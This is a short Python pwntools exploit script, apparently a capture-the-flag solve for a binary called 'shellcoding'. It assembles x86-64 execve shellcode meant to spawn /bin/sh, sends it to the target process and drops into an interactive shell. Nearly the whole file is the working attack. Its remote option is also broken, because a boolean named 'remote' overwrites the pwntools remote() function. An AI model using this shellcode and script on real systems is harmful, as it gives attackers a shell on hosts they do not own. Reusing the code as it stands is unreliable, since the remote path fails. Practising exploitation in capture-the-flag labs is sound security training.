#!/usr/bin/env python3
from pwn import *  # NOQA
import os
import sys


def gethex(string):
    return int(re.findall(r'0x[0-9a-f]+', string)[0][2:], 16)


context.arch = 'amd64'
# context.log_level = 'debug'

if os.getenv("TMUX"):
    context.terminal = "tmux splitw -h".split()
else:
    context.terminal = "kitty sh -c".split()

debug = "--debug" in sys.argv
remote = "--remote" in sys.argv

host = "localhost"
port = 1234
binary_path = "./shellcoding"
libc_path = None

if remote:
    p = remote(host, port)
else:
    p = process(binary_path)

    if debug:
        gdb.attach(p, '''
            c
        ''')

if libc_path:
    libc = ELF(libc_path)

binary = ELF(binary_path)

# modified from: https://packetstormsecurity.com/files/153038/Linux-x64-execve-bin-sh-Shellcode.html
shellcode = asm("""
xor rsi,rsi
push 0x40115b
pop rdi
push 59
pop rax
cdq
syscall
""")

print(enhex(shellcode))
print(len(bytes(shellcode)))

p.recvuntil('it.\n')
# p.sendline(b'\xcc' + bytes(shellcode))  # for debugging b'\xcc' is treated like a breakpoint by gdb
p.sendline(bytes(shellcode))

p.interactive()
